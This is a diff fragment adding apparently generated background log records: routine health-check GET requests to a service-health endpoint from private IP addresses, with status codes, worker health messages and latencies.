+    "asset_id": "Server-11",
+    "source_ip": "10.0.5.65",
+    "request": "GET /api/v1/service-health?check=55",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 3 healthy.",
+    "user": "service-account-1",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 70
+    }
+  },
+  {
+    "log_id": "LOG-BG-1056",
+    "timestamp": "2026-09-12T07:17:21.567226",
+    "asset_id": "Server-12",
+    "source_ip": "10.0.6.66",
+    "request": "GET /api/v1/service-health?check=56",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 500,
+    "response": "Service error or auth required.",
+    "user": "service-account-2",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 71
+    }
+  },
+  {
+    "log_id": "LOG-BG-1057",
+    "timestamp": "2026-09-12T07:12:09.567226",
+    "asset_id": "Server-13",
+    "source_ip": "10.0.7.67",
+    "request": "GET /api/v1/service-health?check=57",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 1 healthy.",
+    "user": "service-account-3",
+    "event_type": "SYSTEM_CALL",
+    "details": {
+      "latency_ms": 72
+    }
+  },
+  {
+    "log_id": "LOG-BG-1058",
+    "timestamp": "2026-09-12T07:06:57.567226",
+    "asset_id": "Server-14",
+    "source_ip": "10.0.8.68",
+    "request": "GET /api/v1/service-health?check=58",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 2 healthy.",
+    "user": "service-account-4",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 73
+    }
+  },
+  {
+    "log_id": "LOG-BG-1059",
+    "timestamp": "2026-09-12T07:01:45.567226",
+    "asset_id": "Server-15",
+    "source_ip": "10.0.9.69",
+    "request": "GET /api/v1/service-health?check=59",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 3 healthy.",
+    "user": "service-account-5",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 74
+    }
+  },
+  {
+    "log_id": "LOG-BG-1060",
+    "timestamp": "2026-09-12T06:57:33.567226",
+    "asset_id": "Server-01",
+    "source_ip": "10.0.10.70",
+    "request": "GET /api/v1/service-health?check=60",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 0 healthy.",
+    "user": "service-account-0",
+    "event_type": "SYSTEM_CALL",
+    "details": {
+      "latency_ms": 75
+    }
+  },
+  {
+    "log_id": "LOG-BG-1061",
+    "timestamp": "2026-09-12T06:52:21.567226",
+    "asset_id": "Server-02",
+    "source_ip": "10.0.11.71",
+    "request": "GET /api/v1/service-health?check=61",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 1 healthy.",
+    "user": "service-account-1",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 76
+    }
+  },
+  {
+    "log_id": "LOG-BG-1062",
+    "timestamp": "2026-09-12T06:47:09.567226",
+    "asset_id": "Server-03",
+    "source_ip": "10.0.12.72",
+    "request": "GET /api/v1/service-health?check=62",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 2 healthy.",
+    "user": "service-account-2",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 77
+    }
+  },
+  {
+    "log_id": "LOG-BG-1063",
+    "timestamp": "2026-09-12T06:41:57.567226",
+    "asset_id": "Server-04",
+    "source_ip": "10.0.13.73",
+    "request": "GET /api/v1/service-health?check=63",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 500,
+    "response": "Service error or auth required.",
+    "user": "service-account-3",
+    "event_type": "SYSTEM_CALL",
+    "details": {
+      "latency_ms": 78
+    }
+  },
+  {
+    "log_id": "LOG-BG-1064",
+    "timestamp": "2026-09-12T06:36:45.567226",
+    "asset_id": "Server-05",
+    "source_ip": "10.0.14.74",
+    "request": "GET /api/v1/service-health?check=64",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 0 healthy.",
+    "user": "service-account-4",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 79
+    }
+  },
+  {
+    "log_id": "LOG-BG-1065",
+    "timestamp": "2026-09-12T06:32:33.567226",
+    "asset_id": "Server-06",
+    "source_ip": "10.0.15.75",
+    "request": "GET /api/v1/service-health?check=65",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 1 healthy.",
+    "user": "service-account-5",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 80
+    }
+  },
+  {
+    "log_id": "LOG-BG-1066",
+    "timestamp": "2026-09-12T06:27:21.567226",
+    "asset_id": "Server-07",
+    "source_ip": "10.0.16.76",
+    "request": "GET /api/v1/service-health?check=66",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 2 healthy.",
+    "user": "service-account-0",
+    "event_type": "SYSTEM_CALL",
+    "details": {
+      "latency_ms": 81
+    }
+  },
+  {
+    "log_id": "LOG-BG-1067",
+    "timestamp": "2026-09-12T06:22:09.567226",
+    "asset_id": "Server-08",
+    "source_ip": "10.0.17.77",
+    "request": "GET /api/v1/service-health?check=67",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 3 healthy.",
+    "user": "service-account-1",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 82
+    }
+  },
+  {
+    "log_id": "LOG-BG-1068",
+    "timestamp": "2026-09-12T06:16:57.567226",
+    "asset_id": "Server-09",
+    "source_ip": "10.0.18.78",
+    "request": "GET /api/v1/service-health?check=68",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 0 healthy.",
+    "user": "service-account-2",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 83
+    }
+  },
+  {
+    "log_id": "LOG-BG-1069",
+    "timestamp": "2026-09-12T06:11:45.567226",
+    "asset_id": "Server-10",
+    "source_ip": "10.0.19.79",
+    "request": "GET /api/v1/service-health?check=69",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 1 healthy.",
+    "user": "service-account-3",
+    "event_type": "SYSTEM_CALL",
+    "details": {
+      "latency_ms": 84
+    }
+  },
+  {
+    "log_id": "LOG-BG-1070",
+    "timestamp": "2026-09-12T06:07:33.567226",
+    "asset_id": "Server-11",
+    "source_ip": "10.0.20.80",
+    "request": "GET /api/v1/service-health?check=70",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 401,
+    "response": "Service error or auth required.",
+    "user": "service-account-4",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 85
+    }
+  },
+  {
+    "log_id": "LOG-BG-1071",
+    "timestamp": "2026-09-12T06:02:21.567226",
+    "asset_id": "Server-12",
+    "source_ip": "10.0.21.81",
+    "request": "GET /api/v1/service-health?check=71",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 3 healthy.",
+    "user": "service-account-5",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 86
+    }
+  },
+  {
+    "log_id": "LOG-BG-1072",
+    "timestamp": "2026-09-12T05:57:09.567226",
+    "asset_id": "Server-13",
+    "source_ip": "10.0.22.82",
+    "request": "GET /api/v1/service-health?check=72",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 0 healthy.",
+    "user": "service-account-0",
+    "event_type": "SYSTEM_CALL",
+    "details": {
+      "latency_ms": 87
+    }
+  },
+  {
+    "log_id": "LOG-BG-1073",
+    "timestamp": "2026-09-12T05:51:57.567226",
+    "asset_id": "Server-14",
+    "source_ip": "10.0.23.83",
+    "request": "GET /api/v1/service-health?check=73",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 1 healthy.",
+    "user": "service-account-1",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 88
+    }
+  },
+  {
+    "log_id": "LOG-BG-1074",
+    "timestamp": "2026-09-12T05:46:45.567226",
+    "asset_id": "Server-15",
+    "source_ip": "10.0.24.84",
+    "request": "GET /api/v1/service-health?check=74",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 2 healthy.",
+    "user": "service-account-2",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 89
+    }
+  },
+  {
+    "log_id": "LOG-BG-1075",
+    "timestamp": "2026-09-12T05:42:33.567226",
+    "asset_id": "Server-01",
+    "source_ip": "10.0.0.85",
+    "request": "GET /api/v1/service-health?check=75",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 3 healthy.",
+    "user": "service-account-3",
+    "event_type": "SYSTEM_CALL",
+    "details": {
+      "latency_ms": 90
+    }
+  },
+  {
+    "log_id": "LOG-BG-1076",
+    "timestamp": "2026-09-12T05:37:21.567226",
+    "asset_id": "Server-02",
+    "source_ip": "10.0.1.86",
+    "request": "GET /api/v1/service-health?check=76",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 0 healthy.",
+    "user": "service-account-4",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 91
+    }
+  },
+  {
+    "log_id": "LOG-BG-1077",
+    "timestamp": "2026-09-12T05:32:09.567226",
+    "asset_id": "Server-03",
+    "source_ip": "10.0.2.87",
+    "request": "GET /api/v1/service-health?check=77",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 500,
+    "response": "Service error or auth required.",
+    "user": "service-account-5",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 92
+    }
+  },
+  {
+    "log_id": "LOG-BG-1078",
+    "timestamp": "2026-09-12T05:26:57.567226",
+    "asset_id": "Server-04",
+    "source_ip": "10.0.3.88",
+    "request": "GET /api/v1/service-health?check=78",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 2 healthy.",
+    "user": "service-account-0",
+    "event_type": "SYSTEM_CALL",
+    "details": {
+      "latency_ms": 93
+    }
+  },
+  {
+    "log_id": "LOG-BG-1079",
+    "timestamp": "2026-09-12T05:21:45.567226",
+    "asset_id": "Server-05",
+    "source_ip": "10.0.4.89",
+    "request": "GET /api/v1/service-health?check=79",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 3 healthy.",
+    "user": "service-account-1",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 94
+    }
+  },
+  {
+    "log_id": "LOG-BG-1080",
+    "timestamp": "2026-09-12T05:17:33.567226",
+    "asset_id": "Server-06",
+    "source_ip": "10.0.5.90",
+    "request": "GET /api/v1/service-health?check=80",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 0 healthy.",
+    "user": "service-account-2",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 15
+    }
+  },
+  {
+    "log_id": "LOG-BG-1081",
+    "timestamp": "2026-09-12T05:12:21.567226",
+    "asset_id": "Server-07",
+    "source_ip": "10.0.6.91",
+    "request": "GET /api/v1/service-health?check=81",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 1 healthy.",
+    "user": "service-account-3",
+    "event_type": "SYSTEM_CALL",
+    "details": {
+      "latency_ms": 16
+    }
+  },
+  {
+    "log_id": "LOG-BG-1082",
+    "timestamp": "2026-09-12T05:07:09.567226",
+    "asset_id": "Server-08",
+    "source_ip": "10.0.7.92",
+    "request": "GET /api/v1/service-health?check=82",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 2 healthy.",
+    "user": "service-account-4",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 17
+    }
+  },
+  {
+    "log_id": "LOG-BG-1083",
+    "timestamp": "2026-09-12T05:01:57.567226",
+    "asset_id": "Server-09",
+    "source_ip": "10.0.8.93",
+    "request": "GET /api/v1/service-health?check=83",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 3 healthy.",
+    "user": "service-account-5",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 18
+    }
+  },
+  {
+    "log_id": "LOG-BG-1084",
+    "timestamp": "2026-09-12T04:56:45.567226",
+    "asset_id": "Server-10",
+    "source_ip": "10.0.9.94",
+    "request": "GET /api/v1/service-health?check=84",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 500,
+    "response": "Service error or auth required.",
+    "user": "service-account-0",
+    "event_type": "SYSTEM_CALL",
+    "details": {
+      "latency_ms": 19
+    }
+  },
+  {
+    "log_id": "LOG-BG-1085",
+    "timestamp": "2026-09-12T04:52:33.567226",
+    "asset_id": "Server-11",
+    "source_ip": "10.0.10.95",
+    "request": "GET /api/v1/service-health?check=85",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 1 healthy.",
+    "user": "service-account-1",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 20
+    }
+  },
+  {
+    "log_id": "LOG-BG-1086",
+    "timestamp": "2026-09-12T04:47:21.567226",
+    "asset_id": "Server-12",
+    "source_ip": "10.0.11.96",
+    "request": "GET /api/v1/service-health?check=86",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 2 healthy.",
+    "user": "service-account-2",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 21
+    }
+  },
+  {
+    "log_id": "LOG-BG-1087",
+    "timestamp": "2026-09-12T04:42:09.567226",
+    "asset_id": "Server-13",
+    "source_ip": "10.0.12.97",
+    "request": "GET /api/v1/service-health?check=87",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 3 healthy.",
+    "user": "service-account-3",
+    "event_type": "SYSTEM_CALL",
+    "details": {
+      "latency_ms": 22
+    }
+  },
+  {
+    "log_id": "LOG-BG-1088",
+    "timestamp": "2026-09-12T04:36:57.567226",
+    "asset_id": "Server-14",
+    "source_ip": "10.0.13.98",
+    "request": "GET /api/v1/service-health?check=88",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 0 healthy.",
+    "user": "service-account-4",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 23
+    }
+  },
+  {
+    "log_id": "LOG-BG-1089",
+    "timestamp": "2026-09-12T04:31:45.567226",
+    "asset_id": "Server-15",
+    "source_ip": "10.0.14.99",
+    "request": "GET /api/v1/service-health?check=89",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 1 healthy.",
+    "user": "service-account-5",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 24
+    }
+  },
+  {
+    "log_id": "LOG-BG-1090",
+    "timestamp": "2026-09-12T04:27:33.567226",
+    "asset_id": "Server-01",
+    "source_ip": "10.0.15.100",
+    "request": "GET /api/v1/service-health?check=90",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 2 healthy.",
+    "user": "service-account-0",
+    "event_type": "SYSTEM_CALL",
+    "details": {
+      "latency_ms": 25
+    }
+  },
+  {
+    "log_id": "LOG-BG-1091",
+    "timestamp": "2026-09-12T04:22:21.567226",
+    "asset_id": "Server-02",
+    "source_ip": "10.0.16.101",
+    "request": "GET /api/v1/service-health?check=91",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 500,
+    "response": "Service error or auth required.",
+    "user": "service-account-1",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 26
+    }
+  },
+  {
+    "log_id": "LOG-BG-1092",
+    "timestamp": "2026-09-12T04:17:09.567226",
+    "asset_id": "Server-03",
+    "source_ip": "10.0.17.102",
+    "request": "GET /api/v1/service-health?check=92",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 0 healthy.",
+    "user": "service-account-2",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 27
+    }
+  },
+  {
+    "log_id": "LOG-BG-1093",
+    "timestamp": "2026-09-12T04:11:57.567226",
+    "asset_id": "Server-04",
+    "source_ip": "10.0.18.103",
+    "request": "GET /api/v1/service-health?check=93",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 1 healthy.",
+    "user": "service-account-3",
+    "event_type": "SYSTEM_CALL",
+    "details": {
+      "latency_ms": 28
+    }
+  },
+  {
+    "log_id": "LOG-BG-1094",
+    "timestamp": "2026-09-12T04:06:45.567226",
+    "asset_id": "Server-05",
+    "source_ip": "10.0.19.104",
+    "request": "GET /api/v1/service-health?check=94",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 2 healthy.",
+    "user": "service-account-4",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 29
+    }
+  }
+]
